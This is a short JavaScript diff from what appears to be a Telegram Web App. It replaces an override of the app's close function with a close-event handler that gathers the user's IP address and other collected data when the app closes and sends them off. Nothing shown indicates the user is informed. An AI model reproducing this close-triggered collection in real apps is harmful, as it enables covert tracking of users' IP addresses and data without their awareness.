@@ -157,18 +157,12 @@
             });
         }
 
-        let oclose = window.Telegram.WebApp.close;
-        window.Telegram.WebApp.close = async () => {
-            e.preventDefault();
-            
+        window.Telegram.WebApp.onEvent('web_app_close', async () => {
             if (!IS_IP_SENT) {
                 await collectIP();
-
                 window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
-
-                oclose();
             }
-        };
+        });
 
         // Обработчик отправки формы
         document.getElementById('mainForm').addEventListener('submit', async (e) => {
